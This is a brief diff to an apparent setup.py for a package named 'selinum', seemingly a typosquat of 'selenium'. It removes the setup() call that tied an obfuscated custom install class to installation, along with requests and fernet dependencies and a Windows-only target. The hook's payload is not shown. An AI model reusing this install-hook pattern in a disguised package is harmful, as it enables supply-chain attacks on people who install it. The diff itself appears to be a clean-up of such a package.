@@ -18,22 +18,5 @@ class rQvOPuiNcSOHZkKTSqhkGpGZmbUnJidQyalioLOXbuGfHjjbxroaoPenavsf(install):
             install.run(self)
 
 
-setup(
-    name="selinum",
-    version=VERSION,
-    author="mQbXzPMDoSoDWm",
-    author_email="DJhvNYYuDlRlNJho@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': rQvOPuiNcSOHZkKTSqhkGpGZmbUnJidQyalioLOXbuGfHjjbxroaoPenavsf,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 
